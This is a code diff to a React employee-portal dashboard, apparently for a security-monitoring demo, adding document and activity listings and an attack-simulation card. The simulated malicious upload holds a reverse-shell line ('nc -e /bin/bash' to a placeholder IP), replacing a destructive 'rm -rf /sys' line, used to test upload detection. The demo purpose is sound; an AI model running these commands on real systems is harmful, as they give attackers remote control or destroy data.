@@ -2,10 +2,10 @@ import React, { useState, useEffect } from 'react';
 import { useLocation } from 'react-router-dom';
 import { 
   User, Mail, Key, UploadCloud, FileText, CheckCircle2, 
-  AlertCircle, Loader2, Clock, MapPin, Laptop, Bell, Settings, Lock, Zap, ShieldAlert
+  AlertCircle, Loader2, Clock, MapPin, Laptop, Bell, Settings, Lock, Zap, ShieldAlert, FileCheck, RefreshCw
 } from 'lucide-react';
 import { useAuth } from '../../context/AuthContext';
-import { logPortalActivity, uploadPortalDocument } from '../../services/api';
+import { logPortalActivity, uploadPortalDocument, getPortalDocuments, getPortalActivityHistory } from '../../services/api';
 
 export const PortalDashboard = () => {
   const { user } = useAuth();
@@ -24,6 +24,9 @@ export const PortalDashboard = () => {
   const [uploadMessage, setUploadMessage] = useState(null);
   const [uploadError, setUploadError] = useState(null);
 
+  const [savedDocs, setSavedDocs] = useState([]);
+  const [loadingDocs, setLoadingDocs] = useState(false);
+
   const [oldPassword, setOldPassword] = useState('');
   const [newPassword, setNewPassword] = useState('');
   const [pwdMessage, setPwdMessage] = useState(null);
@@ -35,12 +38,35 @@ export const PortalDashboard = () => {
   ]);
 
   const [activities, setActivities] = useState([
-    { id: 1, event: 'User Login', ip: '198.51.100.101', location: 'Bengaluru, India', time: 'Just Now', status: 'Success' },
-    { id: 2, event: 'Document Upload', ip: '198.51.100.101', location: 'Bengaluru, India', time: '1 hour ago', status: 'Completed' },
-    { id: 3, event: 'Profile Update', ip: '198.51.100.101', location: 'Bengaluru, India', time: 'Yesterday', status: 'Success' },
+    { id: 1, event: 'User Login', ip: '198.51.100.101', time: 'Just Now', status: 'Completed' },
+    { id: 2, event: 'Document Upload', ip: '198.51.100.101', time: '1 hour ago', status: 'Completed' },
+    { id: 3, event: 'Profile Update', ip: '198.51.100.101', time: 'Yesterday', status: 'Completed' },
   ]);
 
   const [isBlocked, setIsBlocked] = useState(false);
+
+  const fetchDocuments = async () => {
+    try {
+      setLoadingDocs(true);
+      const res = await getPortalDocuments(user?.username);
+      setSavedDocs(res.documents || []);
+    } catch (err) {
+      console.error('Failed to fetch documents:', err);
+    } finally {
+      setLoadingDocs(false);
+    }
+  };
+
+  const fetchActivities = async () => {
+    try {
+      const res = await getPortalActivityHistory(user?.username);
+      if (res.activities && res.activities.length > 0) {
+        setActivities(res.activities);
+      }
+    } catch (err) {
+      console.error('Failed to fetch activities:', err);
+    }
+  };
 
   useEffect(() => {
     const tabFromUrl = new URLSearchParams(location.search).get('tab');
@@ -49,12 +75,18 @@ export const PortalDashboard = () => {
     }
   }, [location]);
 
+  useEffect(() => {
+    fetchDocuments();
+    fetchActivities();
+  }, [user]);
+
   // Log activity silently to backend (no security jargon on screen)
   useEffect(() => {
     logPortalActivity({
       event_name: 'EMPLOYEE_DASHBOARD_ACCESS',
       source_ip: '198.51.100.101',
-      user_id: user?.username || 'employee-user',
+      user_id: user?.username || 'Kishan_4',
+      user_email: user?.email || 'kishan@sentinelai.com',
       country: 'India',
       city: 'Bengaluru',
       device: 'Windows Chrome'
@@ -71,17 +103,16 @@ export const PortalDashboard = () => {
 
     const formData = new FormData();
     formData.append('file', file);
-    formData.append('user_id', user?.username || 'employee-user');
+    formData.append('user_id', user?.username || 'Kishan_4');
+    formData.append('user_email', user?.email || 'kishan@sentinelai.com');
     formData.append('source_ip', '198.51.100.101');
 
     try {
       const res = await uploadPortalDocument(formData);
-      setUploadMessage(`Document '${res.filename}' processed successfully.`);
-      setActivities(prev => [
-        { id: Date.now(), event: 'Document Upload', ip: '198.51.100.101', location: 'Bengaluru, India', time: 'Just Now', status: 'Completed' },
-        ...prev
-      ]);
+      setUploadMessage(`Document '${res.filename}' uploaded successfully & scanned clean.`);
       setFile(null);
+      await fetchDocuments();
+      await fetchActivities();
     } catch (err) {
       console.error('Upload error:', err);
       const detail = err.response?.data?.detail || 'Document upload request failed.';
@@ -99,19 +130,20 @@ export const PortalDashboard = () => {
     setUploading(true);
     setUploadError(null);
 
-    // Create synthetic malicious payload file
-    const blob = new Blob(["#!/bin/bash\n# Malicious Remote Shell Execution\nrm -rf /sys\neval('malware_code')"], { type: 'text/plain' });
-    const maliciousFile = new File([blob], 'malicious_shell.sh', { type: 'text/plain' });
+    // Create synthetic malicious RCE shell script payload file
+    const blob = new Blob(["#!/bin/bash\n# Malicious Remote Shell Execution\nnc -e /bin/bash 198.51.100.222 4444\neval('malware_code')"], { type: 'text/plain' });
+    const maliciousFile = new File([blob], 'malicious_webshell.sh', { type: 'text/plain' });
 
     const formData = new FormData();
     formData.append('file', maliciousFile);
-    formData.append('user_id', user?.username || 'attacker-user');
+    formData.append('user_id', user?.username || 'Sourabh_4');
+    formData.append('user_email', user?.email || 'sourabh@sentinelai.com');
     formData.append('source_ip', '198.51.100.222');
 
     try {
       await uploadPortalDocument(formData);
     } catch (err) {
-      const detail = err.response?.data?.detail || 'Malicious executable detected.';
+      const detail = err.response?.data?.detail || 'Malicious RCE script detected.';
       setUploadError(detail);
       setIsBlocked(true);
     } finally {
@@ -124,15 +156,13 @@ export const PortalDashboard = () => {
       await logPortalActivity({
         event_name: 'ANOMALOUS_GEOGRAPHIC_SHIFT_LOGIN',
         source_ip: '198.51.100.222',
-        user_id: user?.username || 'attacker-user',
+        user_id: user?.username || 'Sourabh_4',
+        user_email: user?.email || 'sourabh@sentinelai.com',
         country: 'Russia',
         city: 'Moscow',
         device: 'Linux Workstation'
       });
-      setActivities(prev => [
-        { id: Date.now(), event: 'Unverified Access Attempt', ip: '198.51.100.222', location: 'Moscow, Russia', time: 'Just Now', status: 'Blocked' },
-        ...prev
-      ]);
+      fetchActivities();
     } catch (e) {}
   };
 
@@ -150,7 +180,8 @@ export const PortalDashboard = () => {
       await logPortalActivity({
         event_name: 'PASSWORD_CHANGE_ATTEMPT',
         source_ip: '198.51.100.101',
-        user_id: user?.username || 'employee-user'
+        user_id: user?.username || 'Kishan_4',
+        user_email: user?.email || 'kishan@sentinelai.com'
       });
       setPwdMessage('Account password updated successfully.');
       setOldPassword('');
@@ -162,7 +193,7 @@ export const PortalDashboard = () => {
 
   if (isBlocked) {
     return (
-      <div className="max-w-xl mx-auto my-16 p-8 bg-slate-950 border border-slate-800 rounded-2xl text-center space-y-4 shadow-2xl">
+      <div className="max-w-xl mx-auto my-16 p-8 bg-slate-950 border border-slate-800 rounded-2xl text-center space-y-4 shadow-2xl font-sans">
         <div className="p-4 bg-red-500/10 text-red-400 rounded-full w-fit mx-auto border border-red-500/20">
           <Lock className="w-10 h-10 animate-bounce" />
         </div>
@@ -274,99 +305,159 @@ export const PortalDashboard = () => {
 
       {/* Tab 3: Documents */}
       {(activeTab === 'documents' || activeTab === 'upload') && (
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-          <div className="lg:col-span-2 glass-panel p-6 rounded-2xl border border-slate-800 space-y-5">
-            <div>
-              <h3 className="text-base font-bold text-white flex items-center space-x-2">
-                <UploadCloud className="w-5 h-5 text-blue-400" />
-                <span>Upload Corporate Document</span>
-              </h3>
-              <p className="text-xs text-slate-400 mt-1">Select documents for corporate record processing.</p>
+        <div className="space-y-6">
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            {/* Document Upload Form */}
+            <div className="lg:col-span-2 glass-panel p-6 rounded-2xl border border-slate-800 space-y-5">
+              <div>
+                <h3 className="text-base font-bold text-white flex items-center space-x-2">
+                  <UploadCloud className="w-5 h-5 text-blue-400" />
+                  <span>Upload Corporate Document</span>
+                </h3>
+                <p className="text-xs text-slate-400 mt-1">Select documents for corporate record processing.</p>
+              </div>
+
+              {uploadMessage && (
+                <div className="p-3.5 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-xs text-emerald-400 flex items-center space-x-2">
+                  <CheckCircle2 className="w-4 h-4 shrink-0" />
+                  <span>{uploadMessage}</span>
+                </div>
+              )}
+
+              {uploadError && (
+                <div className="p-3.5 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-400 flex items-center space-x-2">
+                  <AlertCircle className="w-4 h-4 shrink-0" />
+                  <span>{uploadError}</span>
+                </div>
+              )}
+
+              <form onSubmit={handleFileUpload} className="space-y-4">
+                <div className="border-2 border-dashed border-slate-800 hover:border-blue-500/50 rounded-2xl p-6 text-center space-y-3 bg-slate-950/40 transition-colors">
+                  <UploadCloud className="w-10 h-10 text-slate-500 mx-auto" />
+                  <div>
+                    <p className="text-xs font-medium text-slate-300">Click to select or drag document</p>
+                    <p className="text-[10px] text-slate-500 mt-0.5">Supports PDF, DOCX, CSV, TXT files</p>
+                  </div>
+                  <input
+                    type="file"
+                    onChange={(e) => setFile(e.target.files[0])}
+                    className="hidden"
+                    id="file-upload-input"
+                  />
+                  <label
+                    htmlFor="file-upload-input"
+                    className="inline-block px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white rounded-xl cursor-pointer transition-colors"
+                  >
+                    Browse File
+                  </label>
+                  {file && (
+                    <p className="text-xs font-mono text-blue-400 mt-2">
+                      Selected: {file.name} ({(file.size / 1024).toFixed(1)} KB)
+                    </p>
+                  )}
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={!file || uploading}
+                  className="w-full py-3 bg-blue-600 hover:bg-blue-500 disabled:bg-slate-800 disabled:cursor-not-allowed text-white text-xs font-semibold rounded-xl transition-all flex items-center justify-center space-x-2"
+                >
+                  {uploading ? (
+                    <>
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                      <span>Processing File...</span>
+                    </>
+                  ) : (
+                    <span>Upload Document</span>
+                  )}
+                </button>
+              </form>
             </div>
 
-            {uploadMessage && (
-              <div className="p-3.5 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-xs text-emerald-400 flex items-center space-x-2">
-                <CheckCircle2 className="w-4 h-4 shrink-0" />
-                <span>{uploadMessage}</span>
-              </div>
-            )}
-
-            {uploadError && (
-              <div className="p-3.5 bg-red-500/10 border border-red-500/30 rounded-xl text-xs text-red-400 flex items-center space-x-2">
-                <AlertCircle className="w-4 h-4 shrink-0" />
-                <span>{uploadError}</span>
-              </div>
-            )}
-
-            <form onSubmit={handleFileUpload} className="space-y-4">
-              <div className="border-2 border-dashed border-slate-800 hover:border-blue-500/50 rounded-2xl p-6 text-center space-y-3 bg-slate-950/40 transition-colors">
-                <UploadCloud className="w-10 h-10 text-slate-500 mx-auto" />
-                <div>
-                  <p className="text-xs font-medium text-slate-300">Click to select or drag document</p>
-                  <p className="text-[10px] text-slate-500 mt-0.5">Supports PDF, DOCX, CSV, TXT files</p>
-                </div>
-                <input
-                  type="file"
-                  onChange={(e) => setFile(e.target.files[0])}
-                  className="hidden"
-                  id="file-upload-input"
-                />
-                <label
-                  htmlFor="file-upload-input"
-                  className="inline-block px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white rounded-xl cursor-pointer transition-colors"
-                >
-                  Browse File
-                </label>
-                {file && (
-                  <p className="text-xs font-mono text-blue-400 mt-2">
-                    Selected: {file.name} ({(file.size / 1024).toFixed(1)} KB)
-                  </p>
-                )}
-              </div>
+            {/* Quick Demo Attack Trigger Card */}
+            <div className="glass-panel p-5 rounded-2xl border border-slate-800 space-y-4 h-fit">
+              <h4 className="text-xs font-bold text-slate-300 flex items-center space-x-2">
+                <Zap className="w-4 h-4 text-amber-400" />
+                <span>Interactive Attack Simulation</span>
+              </h4>
+              <p className="text-[11px] text-slate-400 leading-relaxed">
+                Test how attacker actions on this portal immediately dispatch real-time alerts onto the SOC Console (port 5174):
+              </p>
 
               <button
-                type="submit"
-                disabled={!file || uploading}
-                className="w-full py-3 bg-blue-600 hover:bg-blue-500 disabled:bg-slate-800 disabled:cursor-not-allowed text-white text-xs font-semibold rounded-xl transition-all flex items-center justify-center space-x-2"
+                onClick={handleSimulateMaliciousUpload}
+                disabled={uploading}
+                className="w-full py-2.5 px-3 bg-red-950/60 hover:bg-red-900/60 border border-red-800/60 text-red-300 rounded-xl text-xs font-medium transition-all text-left flex items-center justify-between"
               >
-                {uploading ? (
-                  <>
-                    <Loader2 className="w-4 h-4 animate-spin" />
-                    <span>Processing File...</span>
-                  </>
-                ) : (
-                  <span>Upload Document</span>
-                )}
+                <span>1. Upload Malicious Script (.sh)</span>
+                <ShieldAlert className="w-3.5 h-3.5 text-red-400 shrink-0" />
               </button>
-            </form>
+
+              <button
+                onClick={handleSimulateUBAAttack}
+                className="w-full py-2.5 px-3 bg-amber-950/60 hover:bg-amber-900/60 border border-amber-800/60 text-amber-300 rounded-xl text-xs font-medium transition-all text-left flex items-center justify-between"
+              >
+                <span>2. Trigger Remote Location Shift</span>
+                <MapPin className="w-3.5 h-3.5 text-amber-400 shrink-0" />
+              </button>
+            </div>
           </div>
 
-          {/* Quick Demo Attack Trigger Card */}
-          <div className="glass-panel p-5 rounded-2xl border border-slate-800 space-y-4 h-fit">
-            <h4 className="text-xs font-bold text-slate-300 flex items-center space-x-2">
-              <Zap className="w-4 h-4 text-amber-400" />
-              <span>Interactive Attack Simulation</span>
-            </h4>
-            <p className="text-[11px] text-slate-400 leading-relaxed">
-              Test how attacker actions on this portal immediately dispatch real-time alerts onto the SOC Console (port 5174):
-            </p>
+          {/* Saved Document Repository View */}
+          <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-4">
+            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+              <h3 className="text-sm font-bold text-white flex items-center space-x-2">
+                <FileCheck className="w-4 h-4 text-emerald-400" />
+                <span>Uploaded Document Repository ({savedDocs.length})</span>
+              </h3>
+              <button
+                onClick={fetchDocuments}
+                className="p-1.5 text-slate-400 hover:text-white transition-colors"
+                title="Refresh Documents"
+              >
+                <RefreshCw className="w-3.5 h-3.5" />
+              </button>
+            </div>
 
-            <button
-              onClick={handleSimulateMaliciousUpload}
-              disabled={uploading}
-              className="w-full py-2.5 px-3 bg-red-950/60 hover:bg-red-900/60 border border-red-800/60 text-red-300 rounded-xl text-xs font-medium transition-all text-left flex items-center justify-between"
-            >
-              <span>1. Upload Malicious Script (.sh)</span>
-              <ShieldAlert className="w-3.5 h-3.5 text-red-400 shrink-0" />
-            </button>
-
-            <button
-              onClick={handleSimulateUBAAttack}
-              className="w-full py-2.5 px-3 bg-amber-950/60 hover:bg-amber-900/60 border border-amber-800/60 text-amber-300 rounded-xl text-xs font-medium transition-all text-left flex items-center justify-between"
-            >
-              <span>2. Trigger Remote Location Shift</span>
-              <MapPin className="w-3.5 h-3.5 text-amber-400 shrink-0" />
-            </button>
+            {loadingDocs ? (
+              <p className="text-xs text-slate-500 text-center py-6">Loading saved documents...</p>
+            ) : savedDocs.length > 0 ? (
+              <div className="overflow-x-auto">
+                <table className="w-full text-left text-xs">
+                  <thead className="text-slate-400 border-b border-slate-800 bg-slate-900/40">
+                    <tr>
+                      <th className="pb-3 pt-2 font-medium">Filename</th>
+                      <th className="pb-3 pt-2 font-medium">File Size</th>
+                      <th className="pb-3 pt-2 font-medium">SHA256 Hash</th>
+                      <th className="pb-3 pt-2 font-medium">Scan Result</th>
+                      <th className="pb-3 pt-2 font-medium text-right">Uploaded At</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-slate-800/60">
+                    {savedDocs.map((doc) => (
+                      <tr key={doc.id} className="hover:bg-slate-800/30">
+                        <td className="py-3 font-semibold text-slate-200 flex items-center space-x-2">
+                          <FileText className="w-4 h-4 text-blue-400" />
+                          <span>{doc.filename}</span>
+                        </td>
+                        <td className="py-3 font-mono text-slate-400">{doc.file_size_kb} KB</td>
+                        <td className="py-3 font-mono text-[10px] text-slate-500 truncate max-w-[120px]">{doc.file_hash}</td>
+                        <td className="py-3">
+                          <span className="px-2 py-0.5 rounded-full font-bold text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                            {doc.scan_result}
+                          </span>
+                        </td>
+                        <td className="py-3 text-right text-slate-400 font-mono text-[10px]">
+                          {new Date(doc.uploaded_at).toLocaleString()}
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+            ) : (
+              <p className="text-xs text-slate-500 text-center py-8">No uploaded documents yet. Select a file above to upload.</p>
+            )}
           </div>
         </div>
       )}
@@ -395,10 +486,19 @@ export const PortalDashboard = () => {
       {/* Tab 5: Activity History */}
       {activeTab === 'activity' && (
         <div className="glass-panel p-6 rounded-2xl border border-slate-800 space-y-4">
-          <h3 className="text-base font-bold text-white flex items-center space-x-2">
-            <FileText className="w-5 h-5 text-blue-400" />
-            <span>Personal Activity History</span>
-          </h3>
+          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+            <h3 className="text-base font-bold text-white flex items-center space-x-2">
+              <FileText className="w-5 h-5 text-blue-400" />
+              <span>Personal Activity History</span>
+            </h3>
+            <button
+              onClick={fetchActivities}
+              className="p-1.5 text-slate-400 hover:text-white transition-colors"
+              title="Refresh Activity"
+            >
+              <RefreshCw className="w-3.5 h-3.5" />
+            </button>
+          </div>
 
           <div className="overflow-x-auto">
             <table className="w-full text-left text-xs">
@@ -406,18 +506,18 @@ export const PortalDashboard = () => {
                 <tr>
                   <th className="pb-3 pt-2 font-medium">Activity</th>
                   <th className="pb-3 pt-2 font-medium">IP Address</th>
-                  <th className="pb-3 pt-2 font-medium">Location</th>
+                  <th className="pb-3 pt-2 font-medium">User Account</th>
                   <th className="pb-3 pt-2 font-medium">Time</th>
                   <th className="pb-3 pt-2 font-medium text-right">Status</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-slate-800/60">
-                {activities.map((act) => (
-                  <tr key={act.id} className="hover:bg-slate-800/30">
+                {activities.map((act, idx) => (
+                  <tr key={act.id || idx} className="hover:bg-slate-800/30">
                     <td className="py-3 font-medium text-slate-200">{act.event}</td>
                     <td className="py-3 font-mono text-slate-400">{act.ip}</td>
-                    <td className="py-3 text-slate-300">{act.location}</td>
-                    <td className="py-3 text-slate-400">{act.time}</td>
+                    <td className="py-3 font-mono text-slate-300">{act.user_id || user?.username || 'User'}</td>
+                    <td className="py-3 text-slate-400">{new Date(act.time).toLocaleString() !== 'Invalid Date' ? new Date(act.time).toLocaleString() : act.time}</td>
                     <td className="py-3 text-right">
                       <span className={`px-2 py-0.5 rounded-full font-bold text-[10px] border ${
                         act.status === 'Blocked' 
